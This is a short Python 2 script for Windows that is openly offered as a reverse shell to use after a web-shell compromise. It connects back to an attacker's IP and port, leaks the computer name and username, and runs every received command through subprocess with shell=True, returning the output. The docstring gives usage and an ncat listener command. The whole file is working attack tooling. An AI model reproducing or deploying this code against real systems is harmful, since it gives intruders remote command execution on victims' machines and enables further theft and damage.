
'''
Python bug out shell for windows...
quick little interactive shell for those web shells, etc on windows.

usage:  bugout.exe <youripaddr> <yourportlistener>

then ncat -nlvkp <yourportlistener>

wait for the california sunshine
'''

import sys, socket, subprocess, os

args = sys.argv
if len(args) < 3:
    print 'USAGE:  bugout.exe <youripaddr> <yourportlistener>'
    print 'on your end you should have at least done: ncat -nlvkp <port>'
    print 'do you want a call back or what? why are you here?'
    exit()
ip = args[1]
port = int(args[2])

# Stolen from several places
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
s.send('{*BAZINGA - you\'ve got shell*}\n')
cname = os.environ['COMPUTERNAME']
uname = os.environ['USERNAME']
s.send('\ncomputername:  ' + cname)
s.send('\nusername: ' + uname + '\n')
s.send(cname + ': ')
while 1:
    data = s.recv(1024)
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    s.send(stdout_value + cname + ': ')

s.close()


